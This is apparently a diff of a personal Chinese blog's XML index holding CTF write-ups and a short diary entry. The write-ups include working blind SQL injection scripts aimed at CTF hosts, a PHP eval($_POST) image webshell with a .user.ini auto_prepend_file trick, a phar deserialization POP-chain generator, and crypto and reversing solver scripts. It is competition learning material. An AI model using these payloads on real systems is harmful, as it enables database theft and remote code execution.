-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
-<blockquote>
-<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
-</blockquote>
-<p>进行尝试，</p>
-<p>首先id=1union：</p>
-<p>SQL Injection Checked.</p>
-<p>再试试id=union1union：</p>
-<p>bool(false)</p>
-<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
-<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
-
-<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
-<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+    <title>20211017</title>
+    <url>/posts/cd46c142/</url>
+    <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p>
+<p>先上传user.ini</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure>
+<p>然后上传图片马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>访问路径下的index.php，让它自动加载马</p>
+<p>蚁剑或者直接cat flag</p>
+<p>一会儿在本地测试一下</p>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5的一些基操</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>测试工具</tag>
+        <tag>ctf</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -977,26 +999,9 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>20211118</title>
-    <url>/posts/5c3bb6e4/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
-<p>上传shell.jpeg</p>
-<p>直接扫目录即可，没有过滤，非常友善</p>
-<pre><code>var_dump(file_get_contents(&#39;/flag&#39;));
-</code></pre>
-<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p>
-<pre><code>auto_prepend_file=shell.jpeg
-</code></pre>
-<p>以前都是</p>
-<pre><code>auto_append_file=1.txt
-</code></pre>
-<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
-]]></content>
   </entry>
   <entry>
     <title>20211018</title>
@@ -1006,9 +1011,25 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>20211031</title>
+    <url>/posts/161306f5/</url>
+    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
+<p>刚开始玩了会古墓丽影，不想玩了</p>
+<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
+<p>现在博客Github上和服务器上的都能用</p>
+<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
+<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
+<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
+<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>20211117</title>
@@ -1037,30 +1058,92 @@ var_dump(file_get_contents(&quot;/flag&quot;));
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211118</title>
+    <url>/posts/5c3bb6e4/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
+<p>上传shell.jpeg</p>
+<p>直接扫目录即可，没有过滤，非常友善</p>
+<pre><code>var_dump(file_get_contents(&#39;/flag&#39;));
+</code></pre>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p>
+<pre><code>auto_prepend_file=shell.jpeg
+</code></pre>
+<p>以前都是</p>
+<pre><code>auto_append_file=1.txt
+</code></pre>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2021秋季赛部分wp</title>
+    <url>/posts/31200392/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>震惊！平平无奇的web手，竟然把crypto ak了，顺带做了2个re和几个misc。。。</p>
+<p>校赛感觉难度一般，就是给入门的做了，暑假学的好多都用上了，感觉不错。不过持续时间太长了，直接7天，而且国庆那几天贼忙，部门、工作室、新生······时间不是很合理，最后几天直接摆烂了，一个题也没做。</p>
+<span id="more"></span>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote>
+<p>无列名注入，和寒假赛的类似</p>
+</blockquote>
+<p>库名还是cumtctf</p>
+<p>爆表名得到flag_table_1</p>
+<p>无列名注入得到flag，需要变成小写</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.69.241.44:25500/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,_!@#$%^&amp;*()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(1,1000):</span></span><br><span class="line"><span class="string">    for j in s:</span></span><br><span class="line"><span class="string">        time.sleep(0.1)</span></span><br><span class="line"><span class="string">        payload = &quot;1&#x27;/**/||/**/!(ascii(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),&#123;&#125;,1))&lt;&gt;ascii(&#x27;&#123;&#125;&#x27;))#&quot;.format(i, j)</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            &#x27;username&#x27;: payload,</span></span><br><span class="line"><span class="string">            &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">        if res.find(&#x27;good&#x27;) != -1:</span></span><br><span class="line"><span class="string">            table += j</span></span><br><span class="line"><span class="string">            print(table)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;1&#x27;/**/||/**/!(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),1,34)&lt;&gt;&#x27;address,email,flag_table_1,users&#x27;)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload2,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload3 = &quot;1&#x27;/**/||/**/(1,1)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload3,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>): </span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="comment"># for j in s:</span></span><br><span class="line">        hexchar = trans(flag+ <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;||/**/if((select/**/(0,&#123;&#125;)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)),1,0)#&quot;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;good&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># flag += j</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><blockquote>
+<p>phar反序列化</p>
+</blockquote>
+<p>先通过任意文件读取获得class file fun class这些php文件，代码审计</p>
+<p>构造pop链，生成phar文件</p>
+<p>看到已经有其他队伍把这题做出来了，此时先测试看看能不能连上别的队伍上传成功的文件，根据file.php中对文件名的处理，随便测试了几个，发现phar.jpg处理后的文件路径能用，获得flag</p>
+<p>下面贴上自己写的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$File</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$docker</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$cloud</span> = <span class="keyword">new</span> Cloud();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cloud</span>-&gt;docker = <span class="string">&#x27;O\:6\:\&quot;Docker\&quot;\:3\:\&#123;s\:3\:\&quot;str\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container1\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container2\&quot;\;s\:4\:\&quot;haha\&quot;\;\&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$File</span>-&gt;file = <span class="variable">$docker</span>;</span><br><span class="line"><span class="variable">$docker</span>-&gt;str = <span class="variable">$cloud</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$File</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>直接拖到ida里，得到flag</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E6%88%AA%E5%9B%BE20211003125756.png"></p>
+<h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>拖到ILSpy里，获得逆向代码</p>
+<p>简单写个脚本</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppp</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    a %= c</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            num = num * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % c      </span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">array2 = [</span><br><span class="line">            <span class="number">30361</span>,</span><br><span class="line">			<span class="number">550</span>,</span><br><span class="line">			<span class="number">595</span>,</span><br><span class="line">			<span class="number">15412</span>,</span><br><span class="line">			<span class="number">30361</span>,</span><br><span class="line">			<span class="number">15412</span>,</span><br><span class="line">			<span class="number">8346</span>,</span><br><span class="line">			<span class="number">27071</span>,</span><br><span class="line">			<span class="number">37594</span>,</span><br><span class="line">			<span class="number">37534</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">1082</span>,</span><br><span class="line">			<span class="number">19619</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">1082</span>,</span><br><span class="line">			<span class="number">15513</span>,</span><br><span class="line">			<span class="number">29591</span>,</span><br><span class="line">			<span class="number">19596</span>,</span><br><span class="line">			<span class="number">30078</span>,</span><br><span class="line">			<span class="number">27942</span>,</span><br><span class="line">			<span class="number">25366</span>,</span><br><span class="line">			<span class="number">29107</span>,</span><br><span class="line">			<span class="number">7433</span>,</span><br><span class="line">			<span class="number">28493</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">29591</span>,</span><br><span class="line">			<span class="number">2664</span>,</span><br><span class="line">			<span class="number">12540</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array2)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">if</span> array2[j] == ppp(i, <span class="number">377</span>, <span class="number">38009</span>):</span><br><span class="line">            test.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">        print(<span class="built_in">chr</span>(j-i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>跑出flag</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><p>简单写个脚本爆破</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = <span class="number">37</span></span><br><span class="line">b = <span class="number">23</span></span><br><span class="line">c = <span class="number">52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def affine(m,a,b,c):</span></span><br><span class="line"><span class="string">    chipher=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(len(m)):</span></span><br><span class="line"><span class="string">        if m[i] in table:</span></span><br><span class="line"><span class="string">            chipher+=table[(a*(table.find(m[i]))+b)%c]</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            chipher+=m[i]</span></span><br><span class="line"><span class="string">    return chipher</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;aoxL&#123;Fw0_TXk_y3xtW_ZP_TCBg7VLCxGwb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">if</span> t[i] <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> table[(a*(table.find(j))+b)%c] == t[i]:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += t[i]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="lcg"><a href="#lcg" class="headerlink" title="lcg"></a>lcg</h3><p>从网上找个个脚本，写的很详细</p>
+<p><a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag = &#x27;&#x27;.encode()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seed = bytes_to_long(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">length = seed.bit_length()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n=getPrime(length)</span></span><br><span class="line"><span class="string">a=getPrime(length)</span></span><br><span class="line"><span class="string">b=getPrime(length)</span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    seed = (a*seed+b)%n</span></span><br><span class="line"><span class="string">    s.append(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span> </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s=[<span class="number">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class="number">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class="number">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class="number">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class="number">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class="number">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class="number">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class="number">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class="number">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class="number">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    print(long_to_bytes(plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Dear-Alice"><a href="#Dear-Alice" class="headerlink" title="Dear Alice"></a>Dear Alice</h3><p>google ctf 2021原题</p>
+<p><a href="https://github.com/Haorical/Wargames/tree/master/google-2021/h1">https://github.com/Haorical/Wargames/tree/master/google-2021/h1</a></p>
+<p>嫖到脚本</p>
